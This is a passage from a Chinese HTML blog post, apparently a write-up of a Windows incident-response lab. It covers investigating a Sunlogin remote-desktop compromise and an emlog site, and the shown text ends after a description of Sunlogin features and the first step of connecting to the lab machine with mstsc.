@@ -1,0 +1,671 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="0x01前言好久没做玄机了，终于到Windows的版块了，马上来学习一下，借鉴了师傅的文章 https:&#x2F;&#x2F;blog.csdn.net&#x2F;administratorlws&#x2F;article&#x2F;details&#x2F;140358847?ops_request_misc&#x3D;%257B%2522request%255Fid%2522%253A%25221236473242d15e44a20a457eac83664d%">
+<meta property="og:type" content="article">
+<meta property="og:title" content="玄机第四章windows实战">
+<meta property="og:url" content="https://wanth3f1ag.top/2024/12/02/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/index.html">
+<meta property="og:site_name" content="root@wanth3f1ag">
+<meta property="og:description" content="0x01前言好久没做玄机了，终于到Windows的版块了，马上来学习一下，借鉴了师傅的文章 https:&#x2F;&#x2F;blog.csdn.net&#x2F;administratorlws&#x2F;article&#x2F;details&#x2F;140358847?ops_request_misc&#x3D;%257B%2522request%255Fid%2522%253A%25221236473242d15e44a20a457eac83664d%">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241202202955618.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241202203603773.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241202203900337.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241202204010946.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241202204636644.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241202210129658.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241202211458248.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241202212513158.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241202212626252.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241202212839578.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241202213122277.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241202213250339.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241202213456122.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/QQ20241121-201005.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241202214607706.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241203151326710.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241203151434007.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241203153140327.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241203153223296.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241203154041711.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241203154220409.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241203154318690.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241203154705984.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241203155436176.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241203155514683.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241203160143326.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241203160456107.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241203160506963.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241203160847501.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241203160953764.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241203161111521.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241203161519487.png">
+<meta property="article:published_time" content="2024-12-02T12:00:21.000Z">
+<meta property="article:modified_time" content="2025-01-09T16:30:29.133Z">
+<meta property="article:author" content="wanTh3flag">
+<meta property="article:tag" content="玄机第四章windows实战">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241202202955618.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>玄机第四章windows实战</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">H0me</a></li><!--
+     --><!--
+       --><li><a href="/about/">A6out</a></li><!--
+     --><!--
+       --><li><a href="/tags/">T6gs</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Catagory</a></li><!--
+     --><!--
+       --><li><a href="/links/">L1nks</a></li><!--
+     --><!--
+       --><li><a href="/search/">s4arch</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/12/02/sqlmap%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E7%9A%84%E6%91%98%E5%BD%95/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/11/30/web%E5%85%A5%E9%97%A8SSRF%E7%AF%87--ctfshow/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2024/12/02/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2024/12/02/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/&text=玄机第四章windows实战"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2024/12/02/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/&title=玄机第四章windows实战"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2024/12/02/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/&is_video=false&description=玄机第四章windows实战"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=玄机第四章windows实战&body=Check out this article: https://wanth3f1ag.top/2024/12/02/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2024/12/02/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/&title=玄机第四章windows实战"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2024/12/02/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/&title=玄机第四章windows实战"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2024/12/02/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/&title=玄机第四章windows实战"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2024/12/02/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/&title=玄机第四章windows实战"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2024/12/02/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/&name=玄机第四章windows实战&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2024/12/02/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/&t=玄机第四章windows实战"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x01前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02%E6%AD%A3%E6%96%87"><span class="toc-number">2.</span> <span class="toc-text">0x02正文</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E7%AB%A0-windows%E5%AE%9E%E6%88%98-%E5%90%91%E6%97%A5%E8%91%B5"><span class="toc-number">2.1.</span> <span class="toc-text">第四章 windows实战-向日葵</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%91%E6%97%A5%E8%91%B5%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%E8%BD%AF%E4%BB%B6"><span class="toc-number">2.1.1.</span> <span class="toc-text">向日葵远程连接软件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%91%E6%97%A5%E8%91%B5%E7%9A%84%E4%B8%BB%E8%A6%81%E5%8A%9F%E8%83%BD"><span class="toc-number">2.1.1.1.</span> <span class="toc-text">向日葵的主要功能</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9E%E6%8E%A5%E9%9D%B6%E6%9C%BA"><span class="toc-number">2.1.2.</span> <span class="toc-text">连接靶机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%981-%E9%80%9A%E8%BF%87%E6%9C%AC%E5%9C%B0-PC-RDP%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B9%B6%E4%B8%94%E6%89%BE%E5%88%B0%E9%BB%91%E5%AE%A2%E9%A6%96%E6%AC%A1%E6%94%BB%E5%87%BB%E6%88%90%E5%8A%9F%E7%9A%84%E6%97%B6%E9%97%B4%E4%B8%BA%E5%A4%9A%E5%B0%91"><span class="toc-number">2.1.3.</span> <span class="toc-text">问题1:通过本地 PC RDP到服务器并且找到黑客首次攻击成功的时间为多少</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%982-%E9%80%9A%E8%BF%87%E6%9C%AC%E5%9C%B0-PC-RDP%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B9%B6%E4%B8%94%E6%89%BE%E5%88%B0%E9%BB%91%E5%AE%A2%E6%94%BB%E5%87%BB%E7%9A%84-IP-%E4%B8%BA%E5%A4%9A%E5%B0%91"><span class="toc-number">2.1.4.</span> <span class="toc-text">问题2:通过本地 PC RDP到服务器并且找到黑客攻击的 IP 为多少</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%983-%E9%80%9A%E8%BF%87%E6%9C%AC%E5%9C%B0-PC-RDP%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B9%B6%E4%B8%94%E6%89%BE%E5%88%B0%E9%BB%91%E5%AE%A2%E6%89%98%E7%AE%A1%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F-IP-%E4%B8%BA"><span class="toc-number">2.1.5.</span> <span class="toc-text">问题3:通过本地 PC RDP到服务器并且找到黑客托管恶意程序 IP 为</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%984-%E6%89%BE%E5%88%B0%E9%BB%91%E5%AE%A2%E8%A7%A3%E5%AF%86-DEC-%E6%96%87%E4%BB%B6"><span class="toc-number">2.1.6.</span> <span class="toc-text">问题4:找到黑客解密 DEC 文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%985-%E9%80%9A%E8%BF%87%E6%9C%AC%E5%9C%B0-PC-RDP%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B9%B6%E4%B8%94%E8%A7%A3%E5%AF%86%E9%BB%91%E5%AE%A2%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6-%E5%B0%86%E6%A1%8C%E9%9D%A2%E5%8A%A0%E5%AF%86%E6%96%87%E4%BB%B6%E4%B8%AD%E5%85%B3%E9%94%AE%E4%BF%A1%E6%81%AF%E4%BD%9C%E4%B8%BA-FLAG-%E6%8F%90%E4%BA%A4"><span class="toc-number">2.1.7.</span> <span class="toc-text">问题5:通过本地 PC RDP到服务器并且解密黑客勒索软件,将桌面加密文件中关键信息作为 FLAG 提交;</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E7%AB%A0-windows%E5%AE%9E%E6%88%98-emlog"><span class="toc-number">2.2.</span> <span class="toc-text">第四章 windows实战-emlog</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFemlog%EF%BC%9F"><span class="toc-number">2.2.1.</span> <span class="toc-text">什么是emlog？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#emlog%E7%9A%84%E7%89%B9%E7%82%B9"><span class="toc-number">2.2.2.</span> <span class="toc-text">emlog的特点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-number">2.2.3.</span> <span class="toc-text">应用场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9E%E6%8E%A5%E9%9D%B6%E6%9C%BA-1"><span class="toc-number">2.2.4.</span> <span class="toc-text">连接靶机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%981-%E9%80%9A%E8%BF%87%E6%9C%AC%E5%9C%B0-PC-RDP%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B9%B6%E4%B8%94%E6%89%BE%E5%88%B0%E9%BB%91%E5%AE%A2%E6%A4%8D%E5%85%A5-shell-%E5%B0%86%E9%BB%91%E5%AE%A2%E6%A4%8D%E5%85%A5-shell-%E7%9A%84%E5%AF%86%E7%A0%81%E6%8F%90%E4%BA%A4"><span class="toc-number">2.2.5.</span> <span class="toc-text">问题1:通过本地 PC RDP到服务器并且找到黑客植入 shell,,将黑客植入 shell 的密码提交</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%982-%E9%80%9A%E8%BF%87%E6%9C%AC%E5%9C%B0-PC-RDP%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B9%B6%E4%B8%94%E5%88%86%E6%9E%90%E9%BB%91%E5%AE%A2%E6%94%BB%E5%87%BB%E6%88%90%E5%8A%9F%E7%9A%84-IP-%E4%B8%BA%E5%A4%9A%E5%B0%91-%E5%B0%86%E9%BB%91%E5%AE%A2-IP-%E4%BD%9C%E4%B8%BA-FLAG-%E6%8F%90%E4%BA%A4"><span class="toc-number">2.2.6.</span> <span class="toc-text">问题2:通过本地 PC RDP到服务器并且分析黑客攻击成功的 IP 为多少,将黑客 IP 作为 FLAG 提交;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%983%EF%BC%9A%E9%80%9A%E8%BF%87%E6%9C%AC%E5%9C%B0-PC-RDP%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B9%B6%E4%B8%94%E5%88%86%E6%9E%90%E9%BB%91%E5%AE%A2%E7%9A%84%E9%9A%90%E8%97%8F%E8%B4%A6%E6%88%B7%E5%90%8D%E7%A7%B0-%E5%B0%86%E9%BB%91%E5%AE%A2%E9%9A%90%E8%97%8F%E8%B4%A6%E6%88%B7%E5%90%8D%E7%A7%B0%E4%BD%9C%E4%B8%BA-FLAG-%E6%8F%90%E4%BA%A4"><span class="toc-number">2.2.7.</span> <span class="toc-text">问题3：通过本地 PC RDP到服务器并且分析黑客的隐藏账户名称,将黑客隐藏账户名称作为 FLAG 提交;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%984-%E9%80%9A%E8%BF%87%E6%9C%AC%E5%9C%B0-PC-RDP%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B9%B6%E4%B8%94%E5%88%86%E6%9E%90%E9%BB%91%E5%AE%A2%E7%9A%84%E6%8C%96%E7%9F%BF%E7%A8%8B%E5%BA%8F%E7%9A%84%E7%9F%BF%E6%B1%A0%E5%9F%9F%E5%90%8D-%E5%B0%86%E9%BB%91%E5%AE%A2%E6%8C%96%E7%9F%BF%E7%A8%8B%E5%BA%8F%E7%9A%84%E7%9F%BF%E6%B1%A0%E5%9F%9F%E5%90%8D%E7%A7%B0%E4%BD%9C%E4%B8%BA-%E4%BB%85%E5%9F%9F%E5%90%8D-FLAG-%E6%8F%90%E4%BA%A4"><span class="toc-number">2.2.8.</span> <span class="toc-text">问题4:通过本地 PC RDP到服务器并且分析黑客的挖矿程序的矿池域名,将黑客挖矿程序的矿池域名称作为(仅域名)FLAG 提交;</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E7%AB%A0-windows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="toc-number">2.3.</span> <span class="toc-text">第四章-windows日志分析</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        玄机第四章windows实战
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">wanTh3flag</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-12-02T12:00:21.000Z" class="dt-published" itemprop="datePublished">2024-12-02</time>
+        
+        (Updated: <time datetime="2025-01-09T16:30:29.133Z" class="dt-updated" itemprop="dateModified">2025-01-10</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E7%8E%84%E6%9C%BA/">玄机</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/" rel="tag">玄机第四章windows实战</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="0x01前言"><a href="#0x01前言" class="headerlink" title="0x01前言"></a>0x01前言</h1><p>好久没做玄机了，终于到Windows的版块了，马上来学习一下，借鉴了师傅的文章</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/administratorlws/article/details/140358847?ops_request_misc=%257B%2522request%255Fid%2522%253A%25221236473242d15e44a20a457eac83664d%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=1236473242d15e44a20a457eac83664d&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-4-140358847-null-null.nonecase&utm_term=%E7%AC%AC%E5%9B%9B%E7%AB%A0&spm=1018.2226.3001.4450">https://blog.csdn.net/administratorlws/article/details/140358847?ops_request_misc=%257B%2522request%255Fid%2522%253A%25221236473242d15e44a20a457eac83664d%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=1236473242d15e44a20a457eac83664d&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-4-140358847-null-null.nonecase&amp;utm_term=%E7%AC%AC%E5%9B%9B%E7%AB%A0&amp;spm=1018.2226.3001.4450</a></p>
+<h1 id="0x02正文"><a href="#0x02正文" class="headerlink" title="0x02正文"></a>0x02正文</h1><h2 id="第四章-windows实战-向日葵"><a href="#第四章-windows实战-向日葵" class="headerlink" title="第四章 windows实战-向日葵"></a>第四章 windows实战-向日葵</h2><p>先介绍一下向日葵</p>
+<h3 id="向日葵远程连接软件"><a href="#向日葵远程连接软件" class="headerlink" title="向日葵远程连接软件"></a>向日葵远程连接软件</h3><p>向日葵远程连接软件是一款流行的远程桌面软件，主要用于远程控制和远程协助。它允许用户通过互联网远程访问和控制其他计算机和设备，广泛应用于个人用户、企业技术支持、教育等场景。</p>
+<h4 id="向日葵的主要功能"><a href="#向日葵的主要功能" class="headerlink" title="向日葵的主要功能"></a>向日葵的主要功能</h4><ul>
+<li>远程桌面控制：</li>
+</ul>
+<p>允许用户通过网络远程控制另一台计算机的桌面，就像操作本地计算机一样。</p>
+<p>支持多屏显示、屏幕录像、键盘鼠标控制等功能。</p>
+<ul>
+<li>远程文件管理：</li>
+</ul>
+<p>用户可以在远程计算机之间传输文件，进行文件的上传、下载、删除、重命名等操作。</p>
+<p>提供文件夹同步功能，实现两台设备之间的文件自动同步。</p>
+<ul>
+<li>远程摄像头监控：</li>
+</ul>
+<p>可以通过远程查看连接到远程计算机的摄像头，实现远程监控功能。</p>
+<p>支持实时视频传输，查看监控画面。</p>
+<ul>
+<li>远程开关机：</li>
+</ul>
+<p>支持通过网络远程启动或关闭计算机，方便进行远程管理。</p>
+<p>可以设定定时开关机任务，实现自动化管理。</p>
+<ul>
+<li>远程协助：</li>
+</ul>
+<p>用户可以通过向日葵软件向他人提供远程技术支持和帮助。</p>
+<p>支持多人协作，共享屏幕，进行在线会议和培训。</p>
+<ul>
+<li>跨平台支持：</li>
+</ul>
+<p>向日葵支持多种操作系统，包括Windows、macOS、Linux、Android和iOS。<br>用户可以通过不同设备进行远程连接和管理。</p>
+<h3 id="连接靶机"><a href="#连接靶机" class="headerlink" title="连接靶机"></a>连接靶机</h3><p>我们先连接我们的靶机，使用本地的远程桌面连接</p>
+<p>win+cmd 并键入<strong>mstsc</strong></p>
